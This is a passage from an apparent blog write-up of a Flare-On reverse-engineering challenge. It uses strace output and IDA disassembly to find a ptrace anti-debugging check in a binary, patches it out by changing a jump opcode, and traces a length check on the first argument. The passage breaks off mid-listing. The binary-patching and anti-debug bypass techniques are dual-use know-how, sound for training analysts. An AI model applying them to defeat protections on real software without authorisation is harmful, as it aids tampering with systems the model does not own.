</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;two-arguments---message-changed&quot;</span>&gt;two arguments - message changed&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
</span><span class='line'>bad&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;three-arguments---message-changed---shoule-we-stop&quot;</span>&gt;three arguments - message changed - shoule we stop?&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
</span><span class='line'>stahp&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;four-arguments---message-is-the-same---we-should-stop&quot;</span>&gt;four arguments - message is the same - we should stop&lt;/h1&gt;
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
</span><span class='line'>stahp
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. ‘A’*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran <code>ltrace</code> and didn’t see any shared library calls. Let’s run <code>strace</code> to get system calls.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>strace output </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297
</span><span class='line'>execve<span class="o">(</span>“./e7bc5d2c0cf4480348f5504196561297”, <span class="o">[</span>”./e7bc5d2c0cf4480348f55041965612”…<span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span>”Linux”, <span class="nv">node</span><span class="o">=</span>”kali”, …<span class="o">})</span>  <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x13e5000
</span><span class='line'>brk<span class="o">(</span>0x13e61c0<span class="o">)</span>                          <span class="o">=</span> 0x13e61c0
</span><span class='line'>arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x13e5880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0x14071c0<span class="o">)</span>                          <span class="o">=</span> 0x14071c0
</span><span class='line'>brk<span class="o">(</span>0x1408000<span class="o">)</span>                          <span class="o">=</span> 0x1408000
</span><span class='line'>fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, …<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7f20ba6fb000
</span><span class='line'>write<span class="o">(</span>1, “no<span class="se">\n</span>”, 3no
</span><span class='line'><span class="o">)</span>                     <span class="o">=</span> 3
</span><span class='line'>exit_group<span class="o">(</span>52<span class="o">)</span>                          <span class="o">=</span> ?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297 arg1
</span><span class='line'>execve<span class="o">(</span>“./e7bc5d2c0cf4480348f5504196561297”, <span class="o">[</span>”./e7bc5d2c0cf4480348f55041965612”…, “arg1”<span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span>”Linux”, <span class="nv">node</span><span class="o">=</span>”kali”, …<span class="o">})</span>  <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x18cb000
</span><span class='line'>brk<span class="o">(</span>0x18cc1c0<span class="o">)</span>                          <span class="o">=</span> 0x18cc1c0
</span><span class='line'>arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x18cb880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0x18ed1c0<span class="o">)</span>                          <span class="o">=</span> 0x18ed1c0
</span><span class='line'>brk<span class="o">(</span>0x18ee000<span class="o">)</span>                          <span class="o">=</span> 0x18ee000
</span><span class='line'>fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, …<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ffd41ca2000
</span><span class='line'>write<span class="o">(</span>1, “na<span class="se">\n</span>”, 3na
</span><span class='line'><span class="o">)</span>                     <span class="o">=</span> 3
</span><span class='line'>exit_group<span class="o">(</span>423<span class="o">)</span>                         <span class="o">=</span> ?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span><span class='line'>execve<span class="o">(</span>“./e7bc5d2c0cf4480348f5504196561297”, <span class="o">[</span>”./e7bc5d2c0cf4480348f55041965612”…, “arg1”, “arg2”<span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span>”Linux”, <span class="nv">node</span><span class="o">=</span>”kali”, …<span class="o">})</span>  <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x128d000
</span><span class='line'>brk<span class="o">(</span>0x128e1c0<span class="o">)</span>                          <span class="o">=</span> 0x128e1c0
</span><span class='line'>arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x128d880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0x12af1c0<span class="o">)</span>                          <span class="o">=</span> 0x12af1c0
</span><span class='line'>brk<span class="o">(</span>0x12b0000<span class="o">)</span>                          <span class="o">=</span> 0x12b0000
</span><span class='line'>ptrace<span class="o">(</span>PTRACE_TRACEME, 0, 0x1, 0<span class="o">)</span>       <span class="o">=</span> -1 EPERM <span class="o">(</span>Operation not permitted<span class="o">)</span>
</span><span class='line'>fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, …<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7fba3fee7000
</span><span class='line'>write<span class="o">(</span>1, “Program received signal SIGSEGV,”…, 52Program received signal SIGSEGV, Segmentation fault<span class="o">)</span> <span class="o">=</span> 52
</span><span class='line'>exit_group<span class="o">(</span>9001<span class="o">)</span>                        <span class="o">=</span> ?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Syscalls are similar in all traces except with two arguments. We can see that <code>ptrace</code> is being called in line 37. It’s a common <a href="http://reverseengineering.stackexchange.com/a/1931">anti-debug protection</a> in Linux. “[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime.” So we need to bypass <code>ptrace</code>. Searching for <code>ptrace</code> in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for <code>syscall</code> is moved to <code>eax</code> and then it is called. So I search for the text <code>syscall</code> in IDA and then commented each call according to <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">Linux System Call Table for x86_64</a> by <code>@pixnbits</code>. <code>ptrace</code> is <code>0x65</code>:</p>

<p><img src="/images/2014/flare/6-1.jpg" alt="ptrace call" title="ptrace call" /></p>

<p>Later I realized there was a much easier way to find it instead of discovering all calls. Running <code>strace</code> with <code>-i</code> switch will print the instruction pointer at the time of call. Let’s run <code>ptrace</code> on the binary with two arguments with this new swtich and look at the results.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>strace -i </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span><span class='line'><span class="o">[</span>    7f87e90646e7<span class="o">]</span> execve<span class="o">(</span>“./e7bc5d2c0cf4480348f5504196561297”, <span class="o">[</span>”./e7bc5d2c0cf4480348f55041965612”…, “arg1”, “arg2”<span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'><span class="o">[</span>          4a9297<span class="o">]</span> uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span>”Linux”, <span class="nv">node</span><span class="o">=</span>”kali”, …<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0<span class="o">)</span>               <span class="o">=</span> 0x1212000
</span><span class='line'><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x12131c0<span class="o">)</span>       <span class="o">=</span> 0x12131c0
</span><span class='line'><span class="o">[</span>          45e3f5<span class="o">]</span> arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x1212880<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x12341c0<span class="o">)</span>       <span class="o">=</span> 0x12341c0
</span><span class='line'><span class="o">[</span>          4aa78a<span class="o">]</span> brk<span class="o">(</span>0x1235000<span class="o">)</span>       <span class="o">=</span> 0x1235000
</span><span class='line'><span class="o">[</span>          47431b<span class="o">]</span> ptrace<span class="o">(</span>PTRACE_TRACEME, 0, 0x1, 0<span class="o">)</span> <span class="o">=</span> -1 EPERM <span class="o">(</span>Operation not permitted<span class="o">)</span>
</span><span class='line'><span class="o">[</span>          473e44<span class="o">]</span> fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, …<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'><span class="o">[</span>          47509a<span class="o">]</span> mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7f617785f000
</span><span class='line'><span class="o">[</span>          473f50<span class="o">]</span> write<span class="o">(</span>1, “Program received signal SIGSEGV,”…, 52Program received signal SIGSEGV, Segmentation fault<span class="o">)</span> <span class="o">=</span> 52
</span><span class='line'><span class="o">[</span>          473dd8<span class="o">]</span> exit_group<span class="o">(</span>9001<span class="o">)</span>     <span class="o">=</span> ?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Look at IP at the time of <code>ptrace</code> in line 9: <code>47431b</code>. Now look at the IDA screenshot above.</p>

<p>So this function calls <code>ptrace</code>. To find out where this function is being called, highlight it and press <code>x</code> in IDA. There is only one call.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>bypassing ptrace </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F1F8</span> <span class="nv">B9</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F1FD</span> <span class="nv">BA</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F202</span> <span class="nv">BE</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F207</span> <span class="nv">BF</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F20C</span> <span class="nv">B8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F211</span> <span class="nv">E8</span> <span class="mi">9</span><span class="nv">A</span> <span class="mi">50</span> <span class="mi">05</span>    <span class="nv">call</span>    <span class="nv">calls_ptrace</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F216</span> <span class="mi">48</span> <span class="nv">C1</span> <span class="nv">E8</span> <span class="mi">3</span><span class="nv">F</span>    <span class="nv">shr</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mh">3Fh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F21A</span> <span class="mi">84</span> <span class="nv">C0</span>          <span class="nv">test</span>    <span class="nb">al</span><span class="p">,</span> <span class="nb">al</span>     <span class="c1">; if ptrace return value is zero jump to bypass_ptrace</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F21C</span> <span class="mi">74</span> <span class="mi">14</span>          <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">bypass_ptrace</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">000000000041</span><span class="nv">F21E</span> <span class="nv">BF</span> <span class="mi">50</span> <span class="mi">3</span><span class="nv">B</span> <span class="mi">4</span><span class="nv">F</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aProgramReceive</span> <span class="c1">; “Program received signal SIGSEGV, Segmentation fault”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F223</span> <span class="nv">E8</span> <span class="nv">B8</span> <span class="nv">F9</span> <span class="mi">03</span>    <span class="nv">call</span>    <span class="nv">sys_write_call</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F228</span> <span class="nv">BF</span> <span class="mi">29</span> <span class="mi">23</span> <span class="mi">00</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mh">2329h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000041</span><span class="nf">F22D</span> <span class="nv">E8</span> <span class="mi">5</span><span class="nv">E</span> <span class="nv">F5</span> <span class="mi">03</span>    <span class="nv">call</span>    <span class="nv">sub_45E790</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Return value from <code>ptrace</code> is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the <code>Option</code> menu and then <code>General</code>. Change the <code>number of opcode bytes</code>.</p>

<p>To patch the binary to bypass ptrace we need to change the <code>jz</code> instruction in line 9 to <code>jmp</code>. In this short jump <code>0x74</code> stands for <code>jnz</code> and <code>0x14</code> means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to <code>jmp</code>, change <code>0x74</code> to <code>0xEB</code>. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call <code>lazy patching</code>. Search for opcodes for the last few instructions before and <code>jnz</code> in hex editor. In this case we are looking for <code>48 C1 E8 3F 84 C0 74 14</code>. There is probably only one place in the binary with this sequence of bytes. Find it and change <code>0x74</code> to <code>0xEB</code>. Now we have bypassed <code>ptrace</code>. Another alternative is to replace the <code>call calls_ptrace</code> in line 6 with NOPs. NOP is short for No Operation and has the opcode <code>0x90</code>. It actually stands for <code>xchg eax, eax</code>. Both of them work.</p>

<p>So I bypassed <code>ptrace</code>. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:</p>

<ol>
  <li>The binary prints <code>no</code>. Put breakpoints on all <code>sys_write</code> calls and trace the print back</li>
  <li>The application needs to manipulate the arguments somehow. Search for <a href="http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html">string instructions</a>, breakpoint them and see if  we hit one</li>
</ol>

<p>I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a <code>repne scasb</code>.</p>

<p>What does <code>repne scasb</code> do?<br />
<code>repne scasb</code> will scan the string in <code>di/edi/rdi</code> for the byte (<code>scasb</code> is the byte version of <code>scas</code> instruction) in <code>ax/eax/rax</code> and decrease <code>cx/ecx/rcx</code> by one after each execution. It stops if <code>cx/ecx/rcx</code> reaches zero or if a match is found.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>strlen </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00000000004370</span><span class="nv">CF</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C0</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">D6</span> <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">DA</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="kd">DD</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C8</span><span class="p">],</span> <span class="mh">0FFFFFFFFFFFFFFFFh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">E8</span> <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">EB</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>          <span class="c1">; null terminator</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">F0</span> <span class="nv">mov</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C8</span><span class="p">]</span>   <span class="c1">; 0FFFFFFFFFFFFFFFFh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">F7</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; rdi = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FA</span> <span class="nv">repne</span> <span class="nv">scasb</span>             <span class="c1">; searching for null terminator</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FA</span>                         <span class="c1">; in other words strlen</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FC</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004370</span><span class="nf">FF</span> <span class="nv">not</span>     <span class="nb">rax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437102</span> <span class="nf">sub</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437106</span> <span class="nf">cmp</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mh">0Ah</span>        <span class="c1">; if ( strlen(arg1) == 10 ) jump</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043710</span><span class="nf">A</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">strlen_arg1_equals</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Null terminator or <code>0x00</code> is saved in eax in line 6. Line 7 has <code>rcx</code>. We don’t want <code>rcx</code> to reach zero before the end of the string. First argument is saved in <code>rdi</code> in line 8 and finally line 9 calls <code>repne scasb</code>. This is basically <code>strlen(arg1)</code>. In line 14, it is checked if the length of first argument is 10. If so we will jump. </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>strlen_arg1<em>equals</em>10 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">0000000000437120</span> <span class="nv">strlen_arg1</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">equals</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">:</span>  <span class="c1">; strlen(arg1) == 10 Decimal</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437120</span> <span class="nf">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C0</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437127</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043712</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>           <span class="c1">; rax = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043712</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>             <span class="c1">; rdi = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437131</span> <span class="nf">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">468</span><span class="nv">BB0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437136</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">],</span> <span class="nb">rax</span>    <span class="c1">; rax = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043713</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">?</span><span class="p">],</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437147</span> <span class="nf">jmp</span>     <span class="nv">short</span> <span class="nv">loc_437177</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We can see that arg1 is saved to <code>rdi</code> in line 5 and <code>sub_468BB0</code> is called. We can get inside <code>sub_468BB0</code> but it is basically <code>malloc</code>. It allocates a string and initializes it with first argument. Return value is in <code>rax</code> which is a pointer to the newly created string. It is saved to <code>[rbp+arg1_2]</code> (I have renamed the variables). Finally there is an unconditional jump.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>loc_437177 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
